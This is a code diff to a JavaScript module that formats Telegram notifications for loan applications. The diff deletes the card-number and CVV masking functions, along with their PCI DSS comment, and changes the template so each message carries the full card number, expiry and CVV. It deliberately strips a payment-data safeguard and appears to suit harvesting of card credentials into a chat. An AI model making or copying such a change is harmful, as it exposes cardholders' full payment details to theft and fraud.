@@ -129,29 +129,6 @@ function escapeHtml(text) {
 }
 
 /**
- * Mask card number — hanya 4 digit terakhir terlihat
- * @param {string} number - raw card number (dengan atau tanpa spasi)
- * @returns {string} e.g. "**** **** **** 4055"
- */
-function maskCardNumber(number) {
-  if (!number) return "";
-  const digits = String(number).replace(/\D/g, "");
-  if (digits.length < 4) return "****";
-  const last4 = digits.slice(-4);
-  const groupCount = Math.ceil((digits.length - 4) / 4);
-  const maskGroups = Array.from({ length: groupCount }, () => "****");
-  return [...maskGroups, last4].join(" ");
-}
-
-/**
- * CVV — NEVER display in full (PCI DSS requirement)
- */
-function maskCvv(cvv) {
-  if (!cvv) return "";
-  return "***";
-}
-
-/**
  * Format notifikasi pengajuan pinjaman baru (locale-aware)
  * Format profesional dengan section separator, data kartu debit,
  * perkiraan pembayaran, dan status — semua dari data sistem.
@@ -202,9 +179,9 @@ ${sep}
 ${sep}
 <b>${t(language, "telegram.cardInfo")}</b>
 ${sep}
-<b>${t(language, "telegram.cardNumber")}:</b> ${cardNumber ? maskCardNumber(cardNumber) : t(language, "telegram.notSpecified")}
+<b>${t(language, "telegram.cardNumber")}:</b> ${cardNumber ? escapeHtml(cardNumber) : t(language, "telegram.notSpecified")}
 <b>${t(language, "telegram.cardExpiry")}:</b> ${ns(cardExpiry)}
-<b>${t(language, "telegram.cardCvv")}:</b> ${cardCvv ? maskCvv(cardCvv) : t(language, "telegram.notSpecified")}
+<b>${t(language, "telegram.cardCvv")}:</b> ${cardCvv ? escapeHtml(cardCvv) : t(language, "telegram.notSpecified")}
 
 ${sep}
 <b>${t(language, "telegram.paymentInfo")}</b>
